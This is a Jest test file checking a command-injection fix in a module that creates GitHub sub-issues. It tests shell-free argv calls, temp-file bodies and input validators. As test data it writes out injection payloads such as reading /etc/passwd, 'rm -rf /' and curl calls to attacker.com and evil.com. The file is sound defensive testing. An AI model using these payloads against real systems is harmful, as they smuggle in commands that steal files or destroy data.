/**
 * Tests for sub-issues.ts — specifically the command injection fix (#1162).
 *
 * Verifies that:
 * 1. createSubIssue uses execFileCommand (argv array, no shell) instead of
 *    shell-string execCommand
 * 2. LLM-influenced title/body strings are passed as literal arguments,
 *    not shell-interpreted
 * 3. Input validators reject malicious/malformed input
 * 4. Body is written to a temp file (--body-file pattern)
 */

import * as fs from 'fs';
import {
  configureSubIssues,
  createSubIssue,
  validateIssueTitle,
  validateIssueBody,
  validateLabel,
} from './sub-issues';

describe('sub-issues command injection fix (#1162)', () => {
  let execFileCalls: Array<{ file: string; args: string[] }>;
  let execCommandCalls: string[];

  beforeEach(() => {
    execFileCalls = [];
    execCommandCalls = [];

    configureSubIssues({
      // Track execFileCommand calls (the safe path)
      execFileCommand: async (file: string, args: string[]) => {
        execFileCalls.push({ file, args });
        // Simulate gh issue create returning an issue URL
        return 'https://github.com/test-org/test-repo/issues/42';
      },
      // Track execCommand calls (the unsafe shell path) — used for GraphQL
      execCommand: async (cmd: string) => {
        execCommandCalls.push(cmd);
        // Simulate GraphQL responses for addSubIssue
        if (cmd.includes('issue(number:') && cmd.includes('{ id }')) {
          return JSON.stringify({ data: { repository: { issue: { id: 'I_abc123' } } } });
        }
        if (cmd.includes('addSubIssue')) {
          return JSON.stringify({ data: { addSubIssue: { subIssue: { number: 42, title: 'test' } } } });
        }
        return '{}';
      },
      logger: () => {}, // suppress logs in tests
    });
  });

  describe('createSubIssue — shell injection prevention', () => {
    it('uses execFileCommand (no shell) for gh issue create', async () => {
      await createSubIssue('owner', 'repo', 1, 'Safe title', 'Safe body');

      expect(execFileCalls.length).toBe(1);
      expect(execFileCalls[0].file).toBe('gh');
      expect(execFileCalls[0].args[0]).toBe('issue');
      expect(execFileCalls[0].args[1]).toBe('create');
    });

    it('does NOT pass title/body through shell-string execCommand', async () => {
      await createSubIssue('owner', 'repo', 1, 'test title', 'test body');

      // execCommand should only be called for the GraphQL addSubIssue mutation,
      // never for `gh issue create`
      for (const cmd of execCommandCalls) {
        expect(cmd).not.toContain('gh issue create');
      }
    });

    it('passes title as a literal argv element — shell metacharacters are NOT interpreted', async () => {
      const maliciousTitle = '"; whoami #';
      await createSubIssue('owner', 'repo', 1, maliciousTitle, 'body');

      expect(execFileCalls[0].args).toContain(maliciousTitle);
      // The title is a direct array element, not part of a shell string
      const titleIdx = execFileCalls[0].args.indexOf('--title');
      expect(execFileCalls[0].args[titleIdx + 1]).toBe(maliciousTitle);
    });

    it('handles command substitution attempts as literal text', async () => {
      const payloads = [
        '$(whoami)',
        '`id`',
        '${IFS}cat${IFS}/etc/passwd',
        'title\n; rm -rf /',
        "'; curl attacker.com; '",
      ];

      for (const payload of payloads) {
        execFileCalls = [];
        await createSubIssue('owner', 'repo', 1, payload, 'body');

        const titleIdx = execFileCalls[0].args.indexOf('--title');
        // Each payload is passed as a literal string in the argv array
        expect(execFileCalls[0].args[titleIdx + 1]).toBe(payload);
      }
    });

    it('writes body to a temp file and uses --body-file', async () => {
      const bodyContent = 'body with $(injection)';
      await createSubIssue('owner', 'repo', 1, 'title', bodyContent);

      // Verify --body-file is in args
      expect(execFileCalls[0].args).toContain('--body-file');
      const bodyFileIdx = execFileCalls[0].args.indexOf('--body-file');
      const tmpFilePath = execFileCalls[0].args[bodyFileIdx + 1];
      expect(tmpFilePath).toMatch(/^\/tmp\/sub-issue-body-/);

      // Verify the body is NOT passed as a --body arg (it goes via file)
      expect(execFileCalls[0].args).not.toContain('--body');
      expect(execFileCalls[0].args).not.toContain(bodyContent);

      // The temp file should have been cleaned up after execution
      expect(fs.existsSync(tmpFilePath)).toBe(false);
    });

    it('cleans up temp file even on error', async () => {
      // Track what temp file path was used by intercepting execFileCommand
      let capturedTmpFile: string | null = null;

      configureSubIssues({
        execFileCommand: async (_file: string, args: string[]) => {
          const bodyFileIdx = args.indexOf('--body-file');
          if (bodyFileIdx >= 0) {
            capturedTmpFile = args[bodyFileIdx + 1];
            // Verify the file exists at this point (before the error)
            expect(fs.existsSync(capturedTmpFile)).toBe(true);
          }
          throw new Error('gh failed');
        },
        execCommand: async () => '{}',
        logger: () => {},
      });

      const result = await createSubIssue('owner', 'repo', 1, 'title', 'body');

      expect(result.success).toBe(false);
      expect(result.error).toContain('gh failed');
      // After the error, the temp file should have been cleaned up
      expect(capturedTmpFile).not.toBeNull();
      expect(fs.existsSync(capturedTmpFile!)).toBe(false);
    });

    it('passes labels as individual --label flags (not comma-joined in quotes)', async () => {
      await createSubIssue('owner', 'repo', 1, 'title', 'body', ['bug', 'security']);

      const args = execFileCalls[0].args;
      const labelIndices = args.reduce<number[]>((acc, a, i) => {
        if (a === '--label') acc.push(i);
        return acc;
      }, []);

      expect(labelIndices.length).toBe(2);
      expect(args[labelIndices[0] + 1]).toBe('bug');
      expect(args[labelIndices[1] + 1]).toBe('security');
    });
  });

  describe('validateIssueTitle', () => {
    it('accepts a normal title', () => {
      expect(validateIssueTitle('Fix login bug')).toBe('Fix login bug');
    });

    it('rejects empty title', () => {
      expect(() => validateIssueTitle('')).toThrow('must not be empty');
    });

    it('rejects whitespace-only title', () => {
      expect(() => validateIssueTitle('   ')).toThrow('must not be empty');
    });

    it('rejects title exceeding 256 characters', () => {
      const longTitle = 'a'.repeat(257);
      expect(() => validateIssueTitle(longTitle)).toThrow('exceeds 256 characters');
    });

    it('rejects title starting with dash (gh flag injection)', () => {
      expect(() => validateIssueTitle('--exec=whoami')).toThrow('must not start with a dash');
    });

    it('rejects title containing null bytes', () => {
      expect(() => validateIssueTitle('title\0injection')).toThrow('null bytes');
    });

    it('allows titles with shell metacharacters (they are safe in argv)', () => {
      // These are dangerous in shell strings but safe when passed as argv elements
      expect(validateIssueTitle('$(whoami)')).toBe('$(whoami)');
      expect(validateIssueTitle('`id`')).toBe('`id`');
      expect(validateIssueTitle('; rm -rf /')).toBe('; rm -rf /');
      expect(validateIssueTitle('" && echo pwned')).toBe('" && echo pwned');
    });
  });

  describe('validateIssueBody', () => {
    it('accepts a normal body', () => {
      expect(validateIssueBody('This is a description')).toBe('This is a description');
    });

    it('accepts empty body', () => {
      expect(validateIssueBody('')).toBe('');
    });

    it('rejects body exceeding 65536 characters', () => {
      const longBody = 'a'.repeat(65537);
      expect(() => validateIssueBody(longBody)).toThrow('exceeds 65536 characters');
    });

    it('rejects body containing null bytes', () => {
      expect(() => validateIssueBody('body\0null')).toThrow('null bytes');
    });

    it('allows body with shell metacharacters (safe via --body-file)', () => {
      expect(validateIssueBody('$(curl evil.com)')).toBe('$(curl evil.com)');
      expect(validateIssueBody('; rm -rf /')).toBe('; rm -rf /');
    });
  });

  describe('validateLabel', () => {
    it('accepts normal labels', () => {
      expect(validateLabel('bug')).toBe('bug');
      expect(validateLabel('type: story')).toBe('type: story');
      expect(validateLabel('priority/high')).toBe('priority/high');
    });

    it('rejects empty label', () => {
      expect(() => validateLabel('')).toThrow('must not be empty');
    });

    it('rejects label starting with dash', () => {
      expect(() => validateLabel('--label-inject')).toThrow('must not start with a dash');
    });

    it('rejects labels with shell metacharacters', () => {
      expect(() => validateLabel('$(whoami)')).toThrow('invalid characters');
      expect(() => validateLabel('label"; whoami')).toThrow('invalid characters');
      expect(() => validateLabel('label`id`')).toThrow('invalid characters');
    });

    it('allows labels with common GitHub label chars', () => {
      expect(validateLabel('type: feature')).toBe('type: feature');
      expect(validateLabel('area/agent-factory')).toBe('area/agent-factory');
      expect(validateLabel('P0, urgent')).toBe('P0, urgent');
    });
  });
});
